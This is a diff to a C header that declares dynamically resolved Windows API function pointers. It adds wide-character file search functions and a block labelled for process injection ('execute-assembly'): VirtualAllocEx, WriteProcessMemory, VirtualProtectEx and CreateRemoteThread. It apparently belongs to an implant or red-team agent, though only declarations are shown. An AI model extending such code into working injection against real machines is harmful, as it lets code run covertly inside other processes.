@@ -172,6 +172,8 @@ typedef BOOL (WINAPI *PFN_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPP
 extern PFN_WriteFile fnWriteFile;
 typedef HANDLE (WINAPI *PFN_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 extern PFN_CreateFileA fnCreateFileA2;
+typedef HANDLE (WINAPI *PFN_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+extern PFN_CreateFileW fnCreateFileW2;
 typedef DWORD (WINAPI *PFN_GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
 extern PFN_GetModuleFileNameA fnGetModuleFileNameA;
 typedef void (WINAPI *PFN_GetNativeSystemInfo)(LPSYSTEM_INFO);
@@ -210,6 +212,10 @@ typedef HANDLE (WINAPI *PFN_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
 extern PFN_FindFirstFileA fnFindFirstFileA;
 typedef BOOL (WINAPI *PFN_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
 extern PFN_FindNextFileA fnFindNextFileA;
+typedef HANDLE (WINAPI *PFN_FindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
+extern PFN_FindFirstFileW fnFindFirstFileW;
+typedef BOOL (WINAPI *PFN_FindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
+extern PFN_FindNextFileW fnFindNextFileW;
 typedef BOOL (WINAPI *PFN_FindClose)(HANDLE);
 extern PFN_FindClose fnFindClose;
 typedef BOOL (WINAPI *PFN_GetFileAttributesExA)(LPCSTR, GET_FILEEX_INFO_LEVELS, LPVOID);
@@ -323,5 +329,15 @@ typedef HANDLE (WINAPI *PFN_GetProcessHeap)(void);
 extern PFN_GetProcessHeap fnGetProcessHeap;
 typedef BOOL (WINAPI *PFN_HeapFree)(HANDLE, DWORD, LPVOID);
 extern PFN_HeapFree fnHeapFree;
+
+/* Kernel32 — process injection (execute-assembly) */
+typedef LPVOID (WINAPI *PFN_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+extern PFN_VirtualAllocEx fnVirtualAllocEx;
+typedef BOOL (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+extern PFN_WriteProcessMemory fnWriteProcessMemory;
+typedef BOOL (WINAPI *PFN_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+extern PFN_VirtualProtectEx fnVirtualProtectEx;
+typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+extern PFN_CreateRemoteThread fnCreateRemoteThread;
 
 void resolve_apis(void);
